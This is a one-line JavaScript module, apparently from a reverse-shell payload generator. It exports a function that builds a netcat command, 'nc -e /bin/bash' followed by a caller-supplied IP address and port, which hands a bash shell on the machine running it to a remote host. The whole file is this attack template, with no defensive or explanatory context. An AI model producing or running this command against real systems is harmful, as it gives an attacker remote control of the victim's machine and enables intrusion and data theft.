module.exports = (ip, port) => `nc -e /bin/bash ${ip} ${port}`;
